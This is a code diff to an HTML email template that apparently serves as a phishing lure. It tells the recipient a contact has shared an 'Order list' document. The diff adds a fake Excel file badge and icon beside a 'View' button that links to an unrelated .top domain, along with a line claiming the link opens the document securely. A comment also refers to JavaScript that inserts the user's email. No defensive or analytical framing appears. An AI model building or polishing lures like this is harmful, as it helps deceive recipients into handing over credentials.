@@ -68,6 +68,17 @@
             color: #777;
         }
 
+        .file-info {
+            display: inline-flex;
+            align-items: center;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+
+        .file-info img {
+            margin-right: 10px;
+        }
+
     </style>
 </head>
 <body>
@@ -85,8 +96,16 @@
 
     <p>You have received a new document (Order list) from one of your contacts.</p>
 
+    <!-- Excel File Info Section -->
+    <div class="file-info">
+        <img src="https://www.pngitem.com/pimgs/m/256-2567744_excel-icon-png-transparent-background-excel-icon-png.png" alt="Excel Icon" width="30" height="30">
+        <span>Order-list.xlsx</span>
+    </div>
+
+    <!-- View Button -->
     <a href="https://ke-lington-group.top/order-list" class="button" target="_blank">View</a>
 
+    <!-- Smaller Text Explanation -->
     <p class="small-text">This link will redirect you to view the document securely.</p>
 
     <!-- JavaScript to dynamically show the user's email -->
